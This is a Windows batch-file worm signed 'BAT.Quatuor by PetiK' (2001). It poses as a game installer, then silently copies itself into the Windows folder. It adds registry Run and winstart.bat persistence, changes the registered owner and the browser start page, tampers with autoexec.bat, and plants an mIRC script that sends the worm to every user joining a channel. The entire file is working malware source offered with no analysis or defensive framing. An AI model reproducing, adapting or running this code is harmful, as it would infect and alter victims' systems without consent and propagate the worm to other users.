@echo off
cls
echo.
echo.
echo.
echo PLEASE ACCEPT THE NEXT QUESTION TO INSTALL THE GAME
echo.
pause
ctty nul

:debut
copy %0 %windir%\Quatuor.bat
attrib +r %windir%\Quatuor.bat

:reg
if exist %windir%\Win32dll.reg goto autoexec
echo @if exist %windir%\Quatuor.bat %windir%\Quatuor.bat >>%windir%\winstart.bat
echo REGEDIT4 >>%windir%\Win32dll.reg
echo. >>%windir%\Win32dll.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >>%windir%\Win32dll.reg
echo "BAT.Quatuor"="Quatuor.bat" >>%windir%\Win32dll.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion] >>%windir%\Win32dll.reg
echo "RegisteredOwner"="PetiK" >>%windir%\Win32dll.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion] >>%windir%\Win32dll.reg
echo "RegisteredOrganization"="PetiK Corporation" >>%windir%\Win32dll.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main] >>%windir%\Win32dll.reg
echo "Start Page"="http://www.vxgas.fr.fm" >>%windir%\Win32dll.reg
start %windir%\Win32dll.reg
if exist Win32dll.reg del Win32dll.reg

:autoexec
if exist C:\autoexec.quatuor goto mirc
copy C:\autoexec.bat C:\autoexec.quatuor
echo.>>c:\autoexec.bat
echo @echo off >>c:\autoexec.bat
echo echo BAT.Quatuor by PetiK >>C:\autoexec.bat
echo pause>>C:\autoexec.bat
attrib +r C:\autoexec.bat

:mirc
echo [script] >>C:\script.ptk
echo n0=on 1:JOIN:#:{ >>C:\script.ptk
echo n1= /if ( nick == $me ) { halt } >>C:\script.ptk
echo n2= /.dcc send $nick %windir%\Quatuor.bat >>C:\script.ptk
echo n3=} >>C:\script.ptk
if exist C:\mirc\mirc.ini copy C:\script.ptk C:\mirc\script.ini
if exist C:\mirc32\mirc.ini copy C:\script.ptk C:\mirc32\script.ini
if exist C:\progra~1\mirc\mirc.ini copy C:\script.ptk C:\progra~1\mirc\script.ini
if exist C:\progra~1\mirc32\mirc.ini copy C:\script.ptk C:\progra~1\mirc32\script.ini
del C:\script.ptk
echo BAT.Quatuor by PetiK (c)2001. Made in France >%windir%\Desktop\ReadMe.txt
attrib +r %windir%\Desktop\ReadMe.txt

:fin
if exist Win32dll.reg del Win32dll.reg